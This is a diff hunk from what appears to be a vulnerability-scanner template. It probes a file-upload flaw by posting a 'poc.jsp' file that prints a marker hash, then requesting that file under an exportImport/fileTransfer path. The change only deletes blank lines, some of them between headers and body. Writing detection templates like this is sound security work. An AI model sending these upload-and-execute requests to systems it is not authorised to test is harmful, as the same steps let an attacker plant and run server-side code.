@@ -16,18 +16,14 @@ requests:
         Host: {{Hostname}}
         Origin: {{Hostname}}
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
-
         ------WebKitFormBoundaryFy3iNVBftjP6IOwo
         Content-Disposition: form-data; name="file"; filename="poc.jsp"
         Content-Type: application/octet-stream
-
         <%out.print(2be8e556fee1a876f10fa086979b8c7c);%>
         ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
-
       - |
         GET /page/exportImport/fileTransfer/poc.jsp HTTP/1.1
         Host: {{Hostname}}
-
     req-condition: true
     matchers:
       - type: dsl
